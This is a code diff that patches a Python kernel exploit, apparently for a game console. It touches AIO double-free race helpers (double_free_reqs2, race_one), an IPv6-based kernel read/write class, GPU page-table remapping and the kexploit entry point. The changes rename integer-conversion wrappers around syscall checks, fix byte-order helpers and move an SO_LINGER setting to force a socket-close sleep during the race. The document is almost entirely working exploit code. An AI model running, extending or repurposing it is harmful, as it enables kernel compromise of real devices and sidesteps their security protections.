@@ -58,7 +58,7 @@ import struct
 #     def get_cstring(data, addr=0):
 #         return ""
 
-#     def u32_to_i32(value):
+#     def u64_to_i64(value):
 #         return value
 
 
@@ -1330,7 +1330,7 @@ class PrimThread(object):
             self.prepare_structure()
 
         if (
-            u32_to_i32(
+            u64_to_i64(
                 self.sc.syscalls.thr_new(
                     get_ref_addr(self.thr_new_args),
                     0x68,
@@ -1360,7 +1360,7 @@ int aio_submit_cmd(
 
 
 def aio_submit_cmd(cmd, reqs, num_reqs, ids):
-    ret = u32_to_i32(sc.syscalls.aio_submit_cmd(cmd, reqs, num_reqs, 3, ids))  # prio
+    ret = u64_to_i64(sc.syscalls.aio_submit_cmd(cmd, reqs, num_reqs, 3, ids))  # prio
     if ret == -1:
         raise Exception(
             "aio_submit_cmd error: %d\n%s"
@@ -1382,7 +1382,7 @@ int aio_multi_delete(
 
 
 def aio_multi_delete(ids, num_ids, states=AIO_ERRORS):
-    ret = u32_to_i32(sc.syscalls.aio_multi_delete(ids, num_ids, states))
+    ret = u64_to_i64(sc.syscalls.aio_multi_delete(ids, num_ids, states))
     if ret == -1:
         raise Exception(
             "aio_multi_delete error: %d\n%s"
@@ -1404,7 +1404,7 @@ int aio_multi_poll(
 
 
 def aio_multi_poll(ids, num_ids, states=AIO_ERRORS):
-    ret = u32_to_i32(sc.syscalls.aio_multi_poll(ids, num_ids, states))
+    ret = u64_to_i64(sc.syscalls.aio_multi_poll(ids, num_ids, states))
     if ret == -1:
         raise Exception(
             "aio_multi_poll error: %d\n%s"
@@ -1426,7 +1426,7 @@ int aio_multi_cancel(
 
 
 def aio_multi_cancel(ids, num_ids, states=AIO_ERRORS):
-    ret = u32_to_i32(sc.syscalls.aio_multi_cancel(ids, num_ids, states))
+    ret = u64_to_i64(sc.syscalls.aio_multi_cancel(ids, num_ids, states))
     if ret == -1:
         raise Exception(
             "aio_multi_cancel error: %d\n%s"
@@ -1451,7 +1451,7 @@ int aio_multi_wait(
 
 
 def aio_multi_wait(ids, num_ids, states=AIO_ERRORS, mode=1, timeout=0):
-    ret = u32_to_i32(sc.syscalls.aio_multi_wait(ids, num_ids, states, mode, timeout))
+    ret = u64_to_i64(sc.syscalls.aio_multi_wait(ids, num_ids, states, mode, timeout))
     if ret == -1:
         raise Exception(
             "aio_multi_wait error: %d\n%s"
@@ -1464,7 +1464,7 @@ def aio_multi_wait(ids, num_ids, states=AIO_ERRORS, mode=1, timeout=0):
 
 
 def new_socket():
-    sd = u32_to_i32(sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
+    sd = u64_to_i64(sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
     if sd == -1:
         raise Exception(
             "new_socket error: %d\n%s"
@@ -1474,7 +1474,7 @@ def new_socket():
 
 
 def new_tcp_socket():
-    sd = u32_to_i32(sc.syscalls.socket(AF_INET, SOCK_STREAM, 0))
+    sd = u64_to_i64(sc.syscalls.socket(AF_INET, SOCK_STREAM, 0))
     if sd == -1:
         raise Exception(
             "new_tcp_socket error: %d\n%s"
@@ -1484,7 +1484,7 @@ def new_tcp_socket():
 
 
 def ssockopt(sd, level, optname, optval, optlen):
-    if u32_to_i32(sc.syscalls.setsockopt(sd, level, optname, optval, optlen)) == -1:
+    if u64_to_i64(sc.syscalls.setsockopt(sd, level, optname, optval, optlen)) == -1:
         raise Exception(
             "ssockopt error: %d\n%s"
             % (sc.syscalls.setsockopt.errno, sc.syscalls.setsockopt.get_error_string())
@@ -1494,7 +1494,7 @@ def ssockopt(sd, level, optname, optval, optlen):
 def gsockopt(sd, level, optname, optval, optlen):
     size = alloc(8)
     size[0:4] = struct.pack("<I", optlen)
-    if u32_to_i32(sc.syscalls.getsockopt(sd, level, optname, optval, size)) == -1:
+    if u64_to_i64(sc.syscalls.getsockopt(sd, level, optname, optval, size)) == -1:
         raise Exception(
             "gsockopt error: %d\n%s"
             % (sc.syscalls.getsockopt.errno, sc.syscalls.getsockopt.get_error_string())
@@ -1671,7 +1671,7 @@ int _aio_multi_delete(struct thread *td, SceKernelAioSubmitId ids[], u_int num_i
 def create_pipe():
     fildes = alloc(0x10)
     if (
-        u32_to_i32(
+        u64_to_i64(
             sc.syscalls.pipe(
                 fildes,
             )
@@ -1835,15 +1835,15 @@ def race_one(request_addr, tcp_sd, sds):
 def double_free_reqs2(sds):
     # 1. setup socket to wait for soclose
     def htons(port):
-        return ((port & 0xFF) << 8) | ((port >> 8) & 0xFF)
+        return (((port & 0xFF) << 8) | ((port >> 8) & 0xFF)) % 0x10000
 
     def aton(ip):
         parts = ip.split(".")
         return (
-            (int(parts[0]) << 24)
-            | (int(parts[1]) << 16)
-            | (int(parts[2]) << 8)
-            | int(parts[3])
+            (int(parts[3]) << 24)
+            | (int(parts[2]) << 16)
+            | (int(parts[1]) << 8)
+            | int(parts[0])
         )
 
     server_addr = alloc(16)
@@ -1856,15 +1856,16 @@ def double_free_reqs2(sds):
     print("sd_listen: %d" % sd_listen)
 
     enable = struct.pack("<I", 1)
+    nogc.append(enable)
 
     ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, get_ref_addr(enable), 4)
 
-    if u32_to_i32(sc.syscalls.bind(sd_listen, server_addr, 16)) == -1:
+    if u64_to_i64(sc.syscalls.bind(sd_listen, server_addr, 16)) == -1:
         raise Exception(
             "bind error: %d\n%s"
             % (sc.syscalls.bind.errno, sc.syscalls.bind.get_error_string())
         )
-    if u32_to_i32(sc.syscalls.listen(sd_listen, 1)) == -1:
+    if u64_to_i64(sc.syscalls.listen(sd_listen, 1)) == -1:
         raise Exception(
             "listen error: %d\n%s"
             % (sc.syscalls.listen.errno, sc.syscalls.listen.get_error_string())
@@ -1883,7 +1884,7 @@ def double_free_reqs2(sds):
         print("sd_client: %d" % sd_client)
 
         ret = sc.syscalls.connect(sd_client, server_addr, 16)
-        if u32_to_i32(ret) == -1:
+        if u64_to_i64(ret) == -1:
             raise Exception(
                 "connect error: %d\n%s"
                 % (sc.syscalls.connect.errno, sc.syscalls.connect.get_error_string())
@@ -1892,7 +1893,7 @@ def double_free_reqs2(sds):
         print("connected, ret: %d" % ret)
 
         sd_conn = sc.syscalls.accept(sd_listen, 0, 0)
-        if u32_to_i32(sd_conn) == -1:
+        if u64_to_i64(sd_conn) == -1:
             raise Exception(
                 "accept error: %d\n%s"
                 % (sc.syscalls.accept.errno, sc.syscalls.accept.get_error_string())
@@ -1906,7 +1907,7 @@ def double_free_reqs2(sds):
         )  # l_linger - how many seconds to linger for
 
         # force soclose to sleep
-        ssockopt(sd_conn, SOL_SOCKET, SO_LINGER, get_ref_addr(linger_buf), 8)
+        ssockopt(sd_client, SOL_SOCKET, SO_LINGER, get_ref_addr(linger_buf), 8)
 
         reqs1[which_req * 0x28 + 0x20 : which_req * 0x28 + 0x24] = struct.pack(
             "<I", sd_client
@@ -1935,7 +1936,7 @@ def double_free_reqs2(sds):
 
 
 def new_evf(name, flags):
-    ret = u32_to_i32(sc.syscalls.evf_create(name, 0, flags))
+    ret = u64_to_i64(sc.syscalls.evf_create(name, 0, flags))
     if ret == -1:
         raise Exception(
             "evf_create error: %d\n%s"
@@ -1945,12 +1946,12 @@ def new_evf(name, flags):
 
 
 def set_evf_flags(id, flags):
-    if u32_to_i32(sc.syscalls.evf_clear(id, 0)) == -1:
+    if u64_to_i64(sc.syscalls.evf_clear(id, 0)) == -1:
         raise Exception(
             "evf_clear error: %d\n%s"
             % (sc.syscalls.evf_clear.errno, sc.syscalls.evf_clear.get_error_string())
         )
-    if u32_to_i32(sc.syscalls.evf_set(id, flags)) == -1:
+    if u64_to_i64(sc.syscalls.evf_set(id, flags)) == -1:
         raise Exception(
             "evf_set error: %d\n%s"
             % (sc.syscalls.evf_set.errno, sc.syscalls.evf_set.get_error_string())
@@ -1958,7 +1959,7 @@ def set_evf_flags(id, flags):
 
 
 def free_evf(id):
-    if u32_to_i32(sc.syscalls.evf_delete(id)) == -1:
+    if u64_to_i64(sc.syscalls.evf_delete(id)) == -1:
         raise Exception(
             "evf_delete error: %d\n%s"
             % (sc.syscalls.evf_delete.errno, sc.syscalls.evf_delete.get_error_string())
@@ -2474,7 +2475,7 @@ class IPv6KernelRW(object):
 
     def create_pipe_pair(self):
         pipe_fds = alloc(8)
-        res = u32_to_i32(sc.syscalls.pipe(get_ref_addr(pipe_fds)))
+        res = u64_to_i64(sc.syscalls.pipe(get_ref_addr(pipe_fds)))
         if res == -1:
             raise Exception(
                 "pipe error: %d\n%s"
@@ -2750,7 +2751,7 @@ def dangerous_dlsym(mod, symbol):
     out_buf = alloc(8)
     symbol = symbol + b"\0"
 
-    if u32_to_i32(sc.syscalls.dlsym(mod, symbol, out_buf)) == -1:
+    if u64_to_i64(sc.syscalls.dlsym(mod, symbol, out_buf)) == -1:
         raise Exception(
             "dlsym error: %d\n%s"
             % (sc.syscalls.dlsym.errno, sc.syscalls.dlsym.get_error_string())
@@ -2830,7 +2831,7 @@ class GPU(object):
         if victim_ptbe_va is None or page_size != self.dmem_size:
             raise Exception("failed to setup gpu primitives")
 
-        if u32_to_i32(sc.syscalls.mprotect(victim_va, self.dmem_size, prot_ro)) == -1:
+        if u64_to_i64(sc.syscalls.mprotect(victim_va, self.dmem_size, prot_ro)) == -1:
             raise Exception(
                 "mprotect failed: %d\n%s"
                 % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
@@ -2932,7 +2933,7 @@ class GPU(object):
         # remap PTD
 
         if (
-            u32_to_i32(
+            u64_to_i64(
                 sc.syscalls.mprotect(
                     self.victim_va,
                     self.dmem_size,
@@ -2950,7 +2951,7 @@ class GPU(object):
         kernel.write_qword(self.victim_ptbe_va, new_ptb)
 
         if (
-            u32_to_i32(
+            u64_to_i64(
                 sc.syscalls.mprotect(
                     self.victim_va,
                     self.dmem_size,
@@ -3784,7 +3785,7 @@ def kexploit():
     sds_alt = []
 
     if (
-        u32_to_i32(
+        u64_to_i64(
             sc.syscalls.socketpair(
                 AF_UNIX,
                 SOCK_STREAM,
